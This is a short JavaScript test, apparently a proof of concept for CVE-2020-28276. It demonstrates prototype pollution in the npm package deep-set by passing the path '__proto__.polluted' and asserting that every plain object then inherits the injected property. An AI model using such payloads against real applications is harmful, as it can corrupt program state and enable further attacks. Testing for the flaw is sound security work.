//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28276
test("prototype pollution in deep-set", () => {
  expect({}.polluted).toBe(undefined);

  const deepSet = require("deep-set");
  const obj = { 1: "2" };
  deepSet(obj, "__proto__.polluted", "yes");

  expect({}.polluted).toBe("yes");
});
